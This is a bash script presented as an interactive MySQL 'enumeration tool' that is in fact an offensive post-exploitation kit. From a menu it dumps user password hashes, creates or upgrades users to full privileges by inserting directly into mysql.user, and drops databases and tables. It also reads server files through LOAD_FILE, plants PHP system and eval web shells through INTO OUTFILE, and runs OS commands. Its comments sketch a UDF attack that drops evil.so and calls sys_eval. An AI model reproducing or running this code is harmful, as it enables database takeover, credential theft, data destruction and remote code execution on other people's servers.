#!/bin/bash
# HR's Linux MySQL Enumeration Tool
#
#To-Do List:
# allow decisions to be made based on privs
# search option for strings "user, username, pass, pwd, passwd, password, etc or maybe user provided options)
# Use count() to check number of entries in given table/col spread
# Delete known user: -e "DELETE FROM <DB>.<Table> WHERE <COL>='<input-value>';"

#Find way to write evil.so to temp db.table and then dump into file placing it in needed location
# mysql -u root -psup3rs3cr3t -h192.168.2.10 -e "use fooDB; LOAD DATA LOCAL INFILE '/home/hood3drob1n/Desktop/evil.so" INTO TABLE fooTable FIELDS TERMINATED BY '\t' LINE TERMINATED BY '\n' (ColName1, ColName2, ColName3);"
# -e "SELECT * FROM fooTable INTO DUMPFILE '/path/to/lib/evil.so';"
# -e "Select sys_eval('whoami');"

# Global Variables:
ARGS=8
JUNK=/tmp
MySQL_Connector=$(which mysql)
MyDump=$(which mysqldump)
STOR1=$(mktemp -p "$JUNK" -t fooooobarsql.tmp.XXX)
STOR2=$(mktemp -p "$JUNK" -t fooooobarsql2.tmp.XXX)

#First a simple Bashtrap function to handle interupt (CTRL+C)
trap bashtrap INT

bashtrap(){
	echo
	echo
	echo 'CTRL+C has been detected!.....shutting down now' | grep --color '.....shutting down now'
	#exit entire script if called
	rm -f "$STOR1" 2> /dev/null
	rm -f "$STOR1" 2> /dev/null
	exit;
}
#End bashtrap()



function usage_info(){
	echo
	echo "HR's MySQL Tool" | grep --color -E "HR's MySQL Tool"
	echo
	echo "Provide credentials at run time and follow the prompts and menu options after that..." | grep --color 'Provide credentials at run time and follow the prompts and menu options after that'
	echo "$0 -U <username> -P <Password> -H <host>" | grep --color -E "$0||U||username||P||Password||H||host"
	echo
	exit;
}



function cred_check(){
	MySQL_CON="$MySQL_Connector -u$MySQL_UserName -p$MySQL_Password -h$MySQL_Host"
	$MySQL_CON -e STATUS | grep -i uptime > "$STOR1"
	grep -i 'uptime' "$STOR1" > /dev/null 2>&1
	if [ "$?" == 0 ]; then
		echo "Welcome to HR's MySQL Tool" | grep --color "Welcome to HR's MySQL Tool"
		echo
		echo "w00t! DB Connection to '$MySQL_Host' accepted using username '$MySQL_UserName' and '$MySQL_Password' for password" | grep --color "w00t! DB Connection to '$MySQL_Host' accepted using username '$MySQL_UserName' and '$MySQL_Password' for password"
		echo
		MyDdumper="$MyDump -h $MySQL_Host -u $MySQL_UserName --password=$MySQL_Password -C --dump-date"
		decision_tree
	else
		echo
		echo "Credentials dont appear to be working, please double-check and try again.........." | grep --color -E 'Credentials dont appear to be working||please double-check and try again'
		echo
		usage_info
	fi
}




function available_db_check(){
	echo
	echo "Available Databases: " | grep --color 'Available Databases'
	$MySQL_CON -e 'show databases'
	echo
	decision_tree
}



function available_table_check(){
	echo
	echo "Please provide DB Name to grab tables from: " | grep --colo 'Please provide DB Name to grab tables from'
	read dbName
	echo
	echo "OK, grabbing tables from $dbName.............." | grep --color -E 'OK||grabbing tables from'
	echo
	echo "Available Tables for $dbName: " | grep --color 'Available Tables for'
	$MySQL_CON -D$dbName -e 'show tables'
	echo
	decision_tree
}




function available_TblAll_check(){
	echo
	allDB=$($MySQL_CON -e 'show databases')
	echo "$allDB" | while read line
	do
		if [ "$line" == 'Database' ]; then
			echo "Available Tables by DB: " | grep --color 'Available Tables by DB'
		else
			echo "DB => $line" | grep --color 'DB =>'
			$MySQL_CON -D$line -e 'show tables'
			echo
		fi
	done
	echo
}



function available_column_check(){
	echo
	echo "Please provide DB Name: " | grep --color 'Please provide DB Name'
	read dbName
	echo
	echo "Please provide Table Name: " | grep --color 'Please provide Table Name'
	read TblName
	echo
	echo "OK, grabbing columns from table '$TblName' in database '$dbName'.............." | grep --color -E 'OK||grabbing columns from table||in database'
	echo
	echo "Available Columns for $dbName.$TblName: " | grep --color 'Available Columns for '
	$MySQL_CON -D$dbName -e "show columns from $TblName"
	echo
	decision_tree
}




function available_all_check(){
	echo
	allDB=$($MySQL_CON -e 'show databases')
	echo "$allDB" | while read line
	do
		if [ "$line" == 'Database' ]; then
			echo "Available Tables by DB: " | grep --color 'Available Tables by DB'
		else
			echo "DB => $line" | grep --color 'DB =>'
			TABLES=$($MySQL_CON -D$line -e 'show tables')
			if [ ! "$TABLES" == '' ]; then
				echo "Available Tables: " | grep --color 'Available Tables'
				$MySQL_CON -D$line -e 'show tables'
				echo "$TABLES" | while read cols
				do
					if [ "$cols" == "Tables_in_$line" ]; then
						echo -n
					else 
						echo "Available Columns for: $cols" | grep --color 'Available Columns for'
						$MySQL_CON -D$line -e "show columns from $cols"
					fi
				done
				echo
			else
				echo "No Tables for this DB..." | grep --color 'No Tables for this DB'
				echo
			fi
		fi
		echo
	done
	echo
}




function create_new(){
	if [ "$METH" == DUP ]; then
		echo
		echo "Please provide name of database you would like to create: " | grep --color 'Please provide name of database you would like to create'
		read new_db
		echo
		echo "Please provide new username you would like to create and grant access to: " | grep --color 'Please provide new username you would like to create and grant access to'
		read new_db_user
		echo
		echo "Please provide password you would like to use for our new user, $new_db_user: " | grep --color 'Please provide password you would like to use for our new user'
		echo "NOTE: You need to provide the hashed version using the algorithm in use on db" | grep --color 'NOTE'
		echo "Helpful if needed: http://hash.darkbyte.ru/" | grep --color 'Helpful if needed'
		echo "Provide Hashed Pass =>" | grep --color "Provide Hashed Pass =>"
		read new_db_pass
		echo
		echo "OK, here goes.............." | grep --color -E 'OK||here goes'
		Q1="CREATE DATABASE IF NOT EXISTS $new_db;"
		Q2="GRANT ALL ON *.* TO '$new_db_user'@'%' IDENTIFIED BY '$new_db_pass';"
		Q3="FLUSH PRIVILEGES;"
		$MySQL_CON -e "$Q1"
		$MySQL_CON -e "$Q2" > "$STOR2" 2>&1
		grep -i 'Access denied' "$STOR2" > /dev/null 2>&1
		if [ "$?" == 0 ]; then
			echo
			echo "Don't appear to have GRANT privs, going to try INSERT method...." | grep --color -E 'Don||t appear to have GRANT privs||going to try INSERT method'
			echo
			$MySQL_CON -e "INSERT INTO mysql.user (Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections) VALUES('%','$new_db_user','$new_db_pass','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y');"
			$MySQL_CON -e "$Q3"
		else
			$MySQL_CON -e "$Q3"
		fi
		echo
		echo "All done creating new DB '$new_db' for user '$new_db_user' with password '$new_db_pass'" | grep --color -E 'All done creating new DB||for user||with password'
		echo
	fi
	decision_tree
}




function grant_upgrade(){
	if [ "$METH" == UPNUP ]; then
		echo
		echo "Please provide name of user you would like to upgrade or create: " | grep --color 'Please provide name of user you would like to upgrade or create'
		read userUpgrade
		echo
		echo "OK, here goes.............." | grep --color -E 'OK||here goes'
		$MySQL_CON -e "GRANT ALL ON *.* TO '$userUpgrade'@'%';" > "$STOR2" 2>&1
		grep -i 'Access denied' "$STOR2" > /dev/null 2>&1
		if [ "$?" == 0 ]; then
			echo
			echo "Don't appear to have GRANT privs, going to try INSERT method...." | grep --color -E 'Don||t appear to have GRANT privs||going to try INSERT method'
			echo
			echo "Please provide password of user you would like to upgrade (if unknown input what you want it to be): " | grep --color 'Please provide password of user you would like to upgrade (if unknown input what you want it to be)'
			echo "NOTE: You need to provide the hashed version using the algorithm in use on db" | grep --color 'NOTE'
			echo "Helpful if needed: http://hash.darkbyte.ru/" | grep --color 'Helpful if needed'
			echo "Provide Hashed Pass =>" | grep --color "Provide Hashed Pass =>"
			read userPass
			echo
$MySQL_CON -e "INSERT INTO mysql.user (Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections) VALUES('%','$userUpgrade','$userPass','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y'); FLUSH PRIVILEGES;"

		else
			$MySQL_CON -e "FLUSH PRIVILEGES;"
		fi
		echo
		echo "All done, use the privs check option to confirm changes took affect...." | grep --color -E 'All done||use the privs check option to confirm changes took affect'
		echo
	fi
	decision_tree
}



function mofo_drop(){
	if [ "$METH" == DBDROP ]; then
		echo
		echo "Please provide Database name you want to DROP: " | grep --color 'Please provide Database name you want to DROP'
		read dbNameDrop
		echo
		echo "Are you sure you want to drop $dbNameDrop from the records for good? (y/n)" | grep --color -E 'Are you sure you want to drop||from the records for good'
		read dropAnswer
		if [ "$dropAnswer" == 'n' ] || [ "$dropAnswer" == 'N' ]; then
			echo
			echo "OK, aborting drop session............" | grep --color -E 'OK||aborting drop session'
			echo
			decision_tree
		else
			echo
			echo "OK, dropping $dbNameDrop for good..." | grep --color -E 'OK||dropping||for good'
			$MySQL_CON -e "DROP DATABASE $dbNameDrop;"
			echo "It has been done!" | grep --color 'It has been done'
			echo
			decision_tree
		fi
	elif [ "$METH" == TBLDROP ]; then
		echo
		echo "Please provide DB Name: " | grep --color 'Please provide DB Name'
		read dbName
		echo
		echo "Please provide Table Name to Drop from the $dbName database: " | grep --color -E 'Please provide Table Name to Drop from the||database'
		read tblNameDrop
		echo
		echo "Are you sure you want to drop $tblNameDrop from $dbName for good? (y/n)" | grep --color -E 'Are you sure you want to drop||from||for good||y||n'
		read dropAnswer
		if [ "$dropAnswer" == 'n' ] || [ "$dropAnswer" == 'N' ]; then
			echo
			echo "OK, aborting drop session............" | grep --color -E 'OK||aborting drop session'
			echo
			decision_tree
		else
			echo
			echo "OK, dropping $tblNameDrop from $dbName for good..." | grep --color -E 'OK||dropping||from||for good'
			$MySQL_CON -D$dbName -e "DROP TABLE $tblNameDrop;"
			echo "It has been done!" | grep --color 'It has been done'
			echo
			decision_tree
		fi
	fi
}



function my_file_reader(){
	echo
	echo "Please provide the full path to the file you want to read: " | grep --color 'Please provide the full path to the file you want to read'
	read findFile
	echo
	$MySQL_CON -e "SELECT LOAD_FILE('$findFile');" > "$STOR2" 2> /dev/null
	results="$(echo $findFile | sed 's/\//_/g').$MySQL_Host.results"
	cat "$STOR2" > $results
	cat "$STOR2"
	echo
	echo "Do you want to read another file? (y/n)" | grep --color "Do you want to read another file? (y/n)"
	read readFileAnswer
	if [ "$readFileAnswer" == 'n' ] || [ "$readFileAnswer" == 'N' ]; then
		echo
		echo "OK, returning to main menu...." | grep --color "OK, returning to main menu"
		echo
		decision_tree
	else
		my_file_reader
	fi
}




function mysql_users_enum(){
	echo
	echo "Enumerating MySQL Users........" | grep --color 'Enumerating MySQL Users'
	$MySQL_CON -e "SELECT user FROM mysql.user;" | while read userz
	do
		echo "Enumerating => $userz" | grep --color 'Enumerating =>'
		secret=$($MySQL_CON -ss -e "SELECT password FROM mysql.user WHERE user='$userz';")
		echo "Password ==> $secret" | grep --color 'Password ==>'
		$MySQL_CON -e "SELECT Select_priv,Insert_priv,Update_priv,Create_priv,Create_user_priv,Drop_priv,Alter_priv,Grant_priv,File_priv,Super_priv from mysql.user WHERE user='$userz';"
	done
}



function dump_table(){
	echo
	echo "Please provide the name of the DB: " | grep --color 'Please provide the name of the DB'
	read dbDump
	echo
	echo "Please provide the table within $dbDump you want to dump: " | grep --color "Please provide the table within $dbDump you want to dump"
	read dbTbl
	echo
	echo "Dumping $dbTbl from $dbDump...." | grep --color "Dumping $dbTbl from $dbDump"
	$MyDdumper "$dbDump" > backup_"$dbDump"-"$dbTbl"_`date +%Y%m%d%H`.sql
	echo
	echo "Dump complete!" | grep --color 'Dump complete'
}



function dump_db(){
	echo
	echo "Please provide the name of the DB to dump: " | grep --color 'Please provide the name of the DB to dump'
	read dbDump
	echo
	echo "Dumping database $dbDump...." | grep --color "Dumping database $dbDump"
	$MyDdumper "$dbDump" > backup_"$dbDump"_`date +%Y%m%d%H`.sql
	echo
	echo "Dump complete!" | grep --color 'Dump complete'
}



function dump_all(){
	echo 
	echo "Dumping all databases...." | grep --color 'Dumping all databases'
	$MyDdumper --all-databases > backup_all_`date +%Y%m%d%H`.sql
	echo
	echo "Dump complete!" | grep --color 'Dump complete'
}




function file_writer(){
	echo
	echo "Please provide path to writable location: " | grep --color 'Please provide path to writable location'
	read MyPath
	echo
	echo "Please provide name to use for new file (blah.php, 1234.php, fuqu.php, etc): " | grep --color 'Please provide name to use for new file (blah.php, 1234.php, fuqu.php, etc)'
	read MyName
	echo
	MYPATH="$MyPath/$MyName"
	echo "Please choose which option you would like to use: " | grep --color 'Please choose which option you would like to use'
	select write_opts in "Custom Code" "PHP System Shell" "PHP Eval Shell" "Return to Main Menu" "Exit"
	do
		case $write_opts in
			"Custom Code")
				echo
				echo "Please type your code to write below (i.e. <? passthru(\$_POST[cmd]); ?>): " | grep --color "Please type your code to write below (i.e. <? passthru(\$_POST\[cmd\]); ?>)"
				read code
				echo
				echo "writing code to provided path......." | grep --color 'writing code to provided path'
				$MySQL_CON -e "SELECT '$code' INTO OUTFILE '$MYPATH';"
				echo
				echo "It has been done! Go check $MYPATH to confirm though......" | grep --color "It has been done! Go check $MYPATH to confirm though"
				echo
			;;
			"PHP System Shell")
				SysShell="<? system(\$_GET[cmd]); ?>"
				echo
				echo "writing simple shell (<? system(\$_GET[cmd]); ?>) to provided path......." | grep --color "writing simple shell (<? system(\$_GET[cmd]); ?>) to provided path"
				$MySQL_CON -e "SELECT '$SysShell' INTO OUTFILE '$MYPATH';"
				echo
				echo "It has been done! Go check $MYPATH?cmd=id to confirm though......" | grep --color "It has been done! Go check $MYPATH?cmd=id to confirm though"
				echo
			;;
			"PHP Eval Shell")
				EvalShell="<?php eval(base64_decode(\$_REQUEST[x])); ?>"
				echo
				echo "writing PHP eval shell (<?php eval(base64_decode(\$_REQUEST[x])); ?>) to provided path......." | grep --color 'writing PHP eval shell (<?php eval(base64_decode(\$_REQUEST[x])); ?>) to provided path'
				$MySQL_CON -e "SELECT '$EvalShell' INTO OUTFILE '$MYPATH';"
				echo
				echo "It has been done! Go check $MYPATH?x=c3lzdGVtKCdpZCcpOw== to confirm though......" | grep --color "It has been done! Go check $MYPATH?x=c3lzdGVtKCdpZCcpOw== to confirm though"
				echo
			;;
			"Return to Main Menu")
				echo
				echo "OK, returning to main menu........" | grep --color 'OK, returning to main menu'
				echo
				decision_tree
			;;
			"Exit")
				echo
				echo "OK, shutting things down........" | grep --color 'OK, shutting things down'
				echo
				exit;
			;;
		esac
	done



	
}




function mysql_local_cmd_exec(){
	echo
	echo "Please type the command you want to execute (i.e. /bin/bash, id, uname -a, etc): " | grep --color 'Please type the command you want to execute (i.e. /bin/bash, id, uname -a, etc)'
	read cmdRequest
	echo
	$MySQL_CON -e "\! $cmdRequest"
	echo
	echo "Do you want to execute another command? (y/n)" | grep --color "Do you want to execute another command? (y/n)"
	read readCMDAnswer
	if [ "$readCMDAnswer" == 'n' ] || [ "$readCMDAnswer" == 'N' ]; then
		echo
		echo "OK, returning to main menu......" | grep --color 'OK, returning to main menu'
		echo
		decision_tree
	else
		mysql_local_cmd_exec
	fi
}




function custom_sql(){
	echo
	echo "Please type the SQL command you want to execute (i.e. SELECT @@datadir): " | grep --color 'Please type the SQL command you want to execute (i.e. SELECT @@datadir)'
	read customSQL
	echo
	echo "Results:" | grep --color 'Results'
	$MySQL_CON -ss -e "$customSQL;"
	echo
	echo "Do you want to execute another SQL command? (y/n)" | grep --color "Do you want to execute another SQL command? (y/n)"
	read readSQLAnswer
	if [ "$readSQLAnswer" == 'n' ] || [ "$readSQLAnswer" == 'N' ]; then
		echo
		echo "OK, returning to main menu......" | grep --color 'OK, returning to main menu'
		echo
		decision_tree
	else
		custom_sql
	fi
}




function decision_tree(){
	echo "Please select how you would like to use: " | grep --color 'Please select how you would like to use'
	select menu_opts in "Available Databases" "Available Tables in Known DB" "Available Tables for all available DB" "Available Columns in Known Table" "All Available" "Create a New DB and User with Pass" "Drop DB" "Drop Table" "Create User with All Privileges or Grant to Existing User" "Users, Passwords & Privileges" "File Reader" "File Writer" "Execute Local OS Commands" "Execute Custom SQL Commands" "Dump Table" "Dump Database" "Dump All" "Exit"
	do
		echo
		case $menu_opts in
			"Available Databases")
				available_db_check	
			;;
			"Available Tables in Known DB")
				available_table_check	
			;;
			"Available Tables for all available DB")
				available_TblAll_check				
			;;
			"Available Columns in Known Table")
				available_column_check	
			;;
			"All Available")
				available_all_check
			;;	
			"Create a New DB and User with Pass")
				METH=DUP
				create_new
			;;
			"Drop DB")
				METH=DBDROP
				mofo_drop
			;;
			"Drop Table")
				METH=TBLDROP
				mofo_drop
			;;
			"Create User with All Privileges or Grant to Existing User")
				METH=UPNUP
				grant_upgrade
			;;
			"Users, Passwords & Privileges")
				mysql_users_enum
			;;
			"File Reader")
				my_file_reader
			;;
			"File Writer")
				file_writer
			;;
			"Execute Local OS Commands")
				mysql_local_cmd_exec
			;;
			"Execute Custom SQL Commands")
				custom_sql
			;;
			"Dump Table")
				dump_table
			;;
			"Dump Database")
				dump_db
			;;
			"Dump All")
				dump_all
			;;
			"Exit")
				echo
				echo "OK, check you laters........." | grep --color "OK, check you laters"
				echo
				exit;
			;;
			*)
				echo
				echo "Unclear option, bailing out!" | grep --color "Unclear option, bailing out"
				echo
				exit;
			;;
		esac
	done
}




# MAIN-----------------------------------------------------
clear
if [ $# -lt 6 ] || [ -z "$1" ] || [ "$1" == '-h' ] || [ "$1" == '--help' ]; then
	usage_info
fi
while [ $# -ne 0 ];
do
	case $1 in
		-U) shift; MySQL_UserName=$1; shift ;;
		-P) shift; MySQL_Password=$1; shift ;;
		-H) shift; MySQL_Host=$1; shift ;;
		*) echo "Unknown Parameters provided!" | grep --color 'Unknown Parameters provided'; usage_info;;
	esac;
done
cred_check
rm -f "$STOR1" 2> /dev/null
rm -f "$STOR1" 2> /dev/null
#EOF
